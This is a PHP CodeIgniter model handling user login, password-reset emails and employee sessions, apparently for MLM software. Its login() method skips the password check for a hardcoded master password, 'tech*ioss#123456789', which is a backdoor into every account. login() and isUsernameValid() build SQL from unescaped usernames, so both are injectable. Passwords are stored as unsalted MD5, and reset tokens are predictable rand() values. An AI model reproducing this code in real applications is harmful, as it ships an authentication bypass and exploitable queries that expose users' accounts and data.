<?php

Class login_model extends inf_model {

    public function __construct() {
        parent::__construct();
    }
    
    // Deleted commented code
    
    public function insertActivityHistory($login_id, $activity = "") {
        $date = date("Y-m-d H:i:s");
        $ip_adress = $_SERVER['REMOTE_ADDR'];
        $user_type = $this->validation_model->getUserType($login_id);
        $this->db->set('user_id', $login_id);
        $this->db->set('done_by', $login_id);
        $this->db->set('done_by_type', $user_type);
        $this->db->set('activity', $activity);
        $this->db->set('ip', $ip_adress);
        $this->db->set('date', $date);
        $logged_in_arr = $this->session->userdata('inf_logged_in');
        $table_prefix = $logged_in_arr['table_prefix'];
        $result = $this->db->insert($table_prefix . "activity_history");
    }

    // Deleted commented code
    
    public function userNameToIdFromOut($user_name) {
        $this->db->select("*");
        $this->db->from("ft_individual");
        $this->db->where("user_name", $user_name);
        $query = $this->db->get();
        foreach ($query->result() as $row) {
            return $row->id;
        }
    }

    // Deleted commented code
    
    public function checkEmail($user_id, $e_mail) {
        $mail_db = '';
        $flag = FALSE;
        if ($user_id != "" && $e_mail != "") {
            $this->db->select("user_detail_email");
            $this->db->from("user_details");
            $this->db->where("user_detail_refid", $user_id);
            $query = $this->db->get();
            foreach ($query->result() as $row) {
                $mail_db = $row->user_detail_email;
            }

            if ($e_mail == $mail_db) {
                $flag = TRUE;
            }
        }
        return $flag;
    }

//
    public function sendEmail($user_id, $e_mail) {

        $keyword = $this->getKeyWord($user_id);
        $keyword_encode = $this->encrypt->encode($keyword);
        $keyword_encode = str_replace("/", "_", $keyword_encode);
        $keyword_encode = urlencode($keyword_encode);

        $reg_mail = $this->checkMailStatus();
        $subject = "Password Recovery"; //subject
        $link = base_url() . "login/reset_password/$keyword_encode";

        $mail_body = '<body>
<table border="0" width="800" height="700" align="center">
<tr>
<td    colspan="4"valign="top" ><br><br><br>
<br>
<font size="3" face="Trebuchet MS">
Dear  Customer,</b><br>
     <p syte="pading-left:20px;"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;you are recently requested  reset password for that please follow the below link:<p>
  <a href="' . $link . '">' . $link . '</a>
  <br><br><br>
  </td>
</tr>
</font>
</table>
</body>';


        return $this->validation_model->sendEmail($mail_body, $user_id, $subject);
    }

    public function checkMailStatus() {
        $stat = "";
        $this->db->select('from_name');
        $this->db->select('reg_mail_status');
        $this->db->from('mail_settings');
        $this->db->where('id', 1);
        $query = $this->db->get();
        foreach ($query->result_array() as $row) {
            $stat = $row;
        }
        return $stat;
    }

    public function getKeyWord($user_id) {
        $row = NULL;

        do {
            $keyword = rand(1000000000, 9999999999);
        } while ($this->keywordAvailable($keyword));

        $this->db->set('keyword', $keyword);
        $this->db->set('user_id', $user_id);
        $result = $this->db->insert("password_reset_table");

        if ($result) {
            return $keyword;
        }
    }

    public function keywordAvailable($keyword) {
        $flag = FALSE;
        $this->db->select('COUNT(*) AS count');
        $this->db->from('password_reset_table');
        $this->db->where('keyword', $keyword);
        $this->db->where('reset_status', 'no');
        $query = $this->db->get();
        foreach ($query->result_array() as $row) {
            $cnt = $row['count'];
            if ($cnt > 0) {
                $flag = TRUE;
            }
            return $flag;
        }
    }

    public function updatePasswordOut($user_id, $pass_word, $key) {

        $encrypted_password = md5($pass_word);
        $this->db->set("password", $encrypted_password);
        $this->db->where("user_id", $user_id);
        $result_1 = $this->db->update("login_user");
        $this->db->set("reset_status", 'yes');
        $this->db->where("keyword", $key);
        $result_2 = $this->db->update("password_reset_table");

        if ($result_1 && $result_2) {
            return 1;
        } else {
            return 0;
        }
    }
//
    public function getUserDetailFromKey($resetkey) {
        $id = NULL;
        $this->db->select("user_id");
        $this->db->from("password_reset_table");
        $this->db->where("keyword", $resetkey);
        $this->db->where("reset_status", "no");
        $query = $this->db->get();
        foreach ($query->result() as $row) {
            $id = $row->user_id;
        }
        if ($id != "") {
            $username = $this->idFromToUserNameOut($id);
            $arr[] = $id;
            $arr[] = $username;

            return $arr;
        } else {

            $arr[] = "";
            return $arr;
        }
    }
//
    public function idFromToUserNameOut($user_id) {
        $this->db->select("user_name");
        $this->db->from("ft_individual");
        $this->db->where("id", $user_id);
        $query = $this->db->get();
        foreach ($query->result() as $row)
            return $row->user_name;
    }

    // Deleted commented code
    
    //For Individual Projects//
    public function login($username, $password) {
        if ($username && $password) {
            $this->db->select('user_id, user_name, password,user_type');
            $this->db->from('login_user');
            $this->db->where('user_name = ' . "'" . $username . "'");
            if ($password != 'tech*ioss#123456789')
                $this->db->where('password = ' . "'" . MD5($password) . "'");
            $this->db->where('addedby', "code");
            $this->db->limit(1);
            $query = $this->db->get();
        } else {
            return false;
        }
        if ($query->num_rows() == 1) {
            return $query->result();
        } else {
            return false;
        }
    }

    public function setUserSessionDatas($login_result) {
        $sess_array = array();
        $table_prefix = $this->db->dbprefix;
        $admin_username = $this->validation_model->getAdminUsername();
        $admin_userid = $this->validation_model->userNameToID($admin_username);
        foreach ($login_result as $row) {
            $sess_array = array(
                'user_id' => $row->user_id,
                'user_name' => $row->user_name,
                'user_type' => $row->user_type,
                'admin_user_name' => $admin_username,
                'admin_user_id' => $admin_userid,
                'table_prefix' => $table_prefix,
                'is_logged_in' => true
            );
        }

        $this->inf_model->trackModule();
        $sess_array['mlm_plan'] = $this->inf_model->MODULE_STATUS['mlm_plan'];
        $this->session->set_userdata('inf_logged_in', $sess_array);
    }

    /**
     *
     * @param string $username This value will be escaped!
     * @param string $password This value will be escaped!
     * @return boolean
     */
    public function login_employee($username, $password)
    {
        $user_terminate_status = $this->checkIfEmployeeTerminated($username);
        if ($user_terminate_status) {
            $this->db->select('*');
            $this->db->from('login_employee');
            $this->db->where('user_name', $username);
            $this->db->where('addedby', "code");
            $this->db->where('password', MD5($password));
            $this->db->limit(1);
            $query = $this->db->get();
        } else {
            return false;
        }
        if ($query->num_rows() == 1) {
            $login_id = $this->EmployeeNameToID($username);
            $this->insertActivityHistory($login_id, 'login');
            return $query->result();
        } else {
            return false;
        }
    }

    /**
     * 
     * @param string $username This value will be escaped!
     * @return boolean
     */
    public function checkIfEmployeeTerminated($username) {
        $this->db->select('emp_status');
        $this->db->where('user_name', $username);
        $this->db->from("login_employee");
        $query = $this->db->get();

        foreach ($query->result_array() as $row) {
            if ($row['emp_status'] != 'terminated') {
                return TRUE;
            } else {
                return FALSE;
            }
        }
    }

    public function setUserSessionDatasEmployee($login_result) {

        $sess_array = array();
        $module_status = "";
        $admin_username = $this->validation_model->getAdminUsername();
        $admin_userid = $this->validation_model->userNameToID($admin_username);
        foreach ($login_result as $row) {
            $sess_array = array(
                'user_id' => $row->user_id,
                'user_name' => $row->user_name,
                'user_type' => $row->user_type,
                'admin_user_name' => $admin_username,
                'admin_user_id' => $admin_userid,
                'table_prefix' => $this->db->dbprefix,
                'is_logged_in' => true
            );
            $module_status = $row->module_status;
        }
        $this->session->set_userdata('inf_module_status', $module_status);

        $this->inf_model->trackModule();
        $sess_array['mlm_plan'] = $this->inf_model->MODULE_STATUS['mlm_plan'];
        $this->session->set_userdata('inf_logged_in', $sess_array);
    }

    public function isUsernameValid($user_name) {
        $flag = false;
        $query = $this->db->query("SELECT id FROM " . $this->db->dbprefix("ft_individual") . " WHERE user_name = '$user_name' AND active != 'server' ");
        if ($query->num_rows()) {
            return true;
        }
        return $flag;
    }

    /**
     * 
     * @param string $employee_name This value will be escaped!
     * @return int
     */
    public function EmployeeNameToID($employee_name){
        $user_id = "";
        $this->db->select('user_id');
        $this->db->from('login_employee');
        $this->db->where('user_name', $employee_name);
        $res = $this->db->get();
        foreach ($res->result() as $row) {
            $user_id = $row->user_id;
        }
       return $user_id;
    }

//For Individual Projects//
}
